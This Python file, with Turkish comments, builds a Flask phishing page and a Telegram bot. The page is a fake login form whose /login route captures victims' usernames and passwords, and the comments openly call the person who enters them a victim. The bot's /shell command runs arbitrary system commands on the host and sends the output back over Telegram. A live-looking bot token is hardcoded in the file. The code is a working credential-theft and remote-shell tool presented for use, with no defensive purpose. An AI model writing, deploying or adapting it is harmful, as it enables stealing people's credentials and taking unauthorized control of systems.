import os
import subprocess
from flask import Flask, request, render_template_string
import telebot

# Bot Token ve Yapılandırma
TOKEN = "8618728444:AAGTHl35WhJ5vA0MzxZajt4ynOIy_rajhMo"
ADMIN_CHAT_ID = ""  # İstersen kendi Telegram ID'ni yazabilirsin (isteğe bağlı)

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- 1. WEB / PHISHING / GİRİŞ SAYFASI KISMI ---
# Flask, Render üzerinde bir web sitesi olarak bu sayfayı açacak.
# Kullanıcı bu sayfaya girdiğinde sahte bir giriş paneli görecek.
PHISHING_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Giriş Yap</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        .login-box h2 { margin-bottom: 20px; color: #333; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 10px; background: #007bff; border: none; color: white; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .login-box button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Oturum Aç</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Kullanıcı Adı veya E-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    # Render'da site açıldığında görünecek durum
    return "[+] Public Bot Node Online & Web Server Active."

@app.route("/panel", methods=["GET"])
def phishing_page():
    # Sahte giriş panelini sunar
    return render_template_string(PHISHING_TEMPLATE)

@app.route("/login", methods=["POST"])
def capture_credentials():
    # Kurban bilgileri girdiğinde buraya düşer
    user = request.form.get("username")
    pwd = request.form.get("password")
    
    # Bilgileri konsola yazdırır (veya istersen bot ile sana mesaj atmasını sağlarız)
    print(f"[!] YAKALANAN BİLGİ -> Kullanıcı: {user} | Şifre: {pwd}")
    
    # Bilgiler alındıktan sonra gerçek bir siteye yönlendirebilirsin
    return "<h3>Giriş başarısız, lütfen tekrar deneyin.</h3><script>setTimeout(function(){window.location.href='/panel';}, 3000);</script>"


# --- 2. TELEGRAM BOT KOMUTLARI (SHELL VE KONTROL) ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "[+] Entegre Bot Aktif!\n\nKomutlar:\n/shell <komut> - Sistem komutu çalıştırır\n/info - Sunucu durumunu gösterir")

@bot.message_handler(commands=['info'])
def send_info(message):
    bot.reply_to(message, f"[i] Çalışma Dizini: {os.getcwd()}\n[i] İşletim Sistemi: {os.name}")

@bot.message_handler(commands=['shell'])
def handle_shell(message):
    command = message.text.replace("/shell", "").strip()
    if not command:
        bot.reply_to(message, "Komut belirtmedin.")
        return

    try:
        output = subprocess.run(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, timeout=10
        )
        result = output.stdout + output.stderr
        if not result:
            result = "İşlem tamamlandı, çıktı üretmedi."
    except Exception as e:
        result = f"Hata: {str(e)}"

    # Uzun çıktıları bölerek veya blok halinde yolla
    if len(result) > 4000:
        result = result[:4000] + "\n[Kesildi...]"

    bot.reply_to(message, f"```\n{result}\n```", parse_mode="Markdown")


# --- 3. UYGULAMA ÇALIŞTIRMA ---
if __name__ == "__main__":
    # Flask ve Botu aynı anda yönetmek için polling (Gunicorn kullanırken Render wsgi üzerinden ayağa kaldırır)
    print("[+] Sistem başlatılıyor...")
    bot.infinity_polling()
    
